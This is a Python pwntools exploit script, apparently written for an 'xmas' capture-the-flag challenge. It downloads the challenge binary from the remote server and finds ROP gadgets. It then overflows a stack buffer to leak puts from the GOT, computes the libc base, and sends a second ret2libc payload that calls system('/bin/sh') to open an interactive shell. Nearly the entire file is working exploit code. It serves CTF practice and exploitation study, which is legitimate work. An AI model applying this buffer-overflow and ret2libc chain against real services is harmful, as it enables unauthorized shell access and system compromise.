#!/bin/env python3
from pwn import *
import os
import sys
import subprocess

# Removes pwntools from printing unnecessary garbage
#context.log_level = 'critical'

# set the architecture we are working with
context.arch = 'amd64'


# Determine the exploit location remote or local
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    rem = True
else:
	rem = False


if rem:					# remote exploit code
    # initialise connection
    host, port = 'challs.xmas.htsp.ro', 12002

    p = remote(host, port)
    
    # Get the binary from output
    p.recvuntil("Content: b'")
    encoded_bin = p.recvuntil('\n\n\n\n').decode('utf-8').strip('\n').strip("'")
    binary = base64.decodebytes(encoded_bin.encode())

	# save the binary and set correct permission
    file = open('binary', 'wb')
    file.write(binary)
    file.close()
    os.system('chmod +x ./binary')

else:			# local exploit code
    # run the binary
    p = process('./binary')



########################################################################
##################### Shoping for the Magic Portions  ##################
########################################################################

# open the binary
binary = ELF('./binary')

# Get the gadgets
pop_rdi = p64(next(binary.search(asm('pop rdi; ret'))))
ret = p64(next(binary.search(asm('ret'))))

# get the addresses of puts_plt and puts_got from the binary
puts_got = p64(binary.got['puts'])
puts_plt = p64(binary.plt['puts'])

########################################################################
########################################################################
########################################################################





########################################################################
################### Dynamic annalysis for the binary ###################
########################################################################


# Call the helper script
# Address of main
# Determine size of buffer
main,buff_size = subprocess.check_output('./tec.sh',shell=True).decode('utf-8').strip('\n').split('\n')
main = p64(int(main, 16))
buff_size = int(buff_size, 16)

# Prepare padding for our exploit
offset = b'A'*buff_size + b'8bytJUNK'

########################################################################
########################################################################
########################################################################






p.recvuntil('?')
# print address of puts from libc 
# and then return back to main so that we can enter our second payload
p.sendline( offset + pop_rdi + puts_got + puts_plt + main)
p.recvline()
p.recvline()
leak = p.recvline()
leaked_puts = u64(leak[:-1] + b'\x00\x00')
log.success('puts leaked at :' + hex(leaked_puts))






########################################################################
############################# Libc Stuff ################################
########################################################################

# Select the appropriate libc
if rem:
    libc = ELF('./libc-2.27.so')
else:
    libc = ELF(input("path to your local libc: ").strip('\n'))


# Search the puts and system offset in selected libc
libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']


# Calculate libc base address
lba = leaked_puts - libc_puts_offset
log.success("Libc base address: " + hex(lba))

# Calculate address of system and binsh string in current process
system = p64(lba + libc_system_offset)
bin_sh = p64(next(libc.search(b'/bin/sh')) + lba)
########################################################################
########################################################################
########################################################################



# Final payload to get the shell
payload = offset + ret + pop_rdi + bin_sh + system
p.recvuntil('?')
p.sendline(payload)
p.recvline()
p.recvline()
p.interactive()
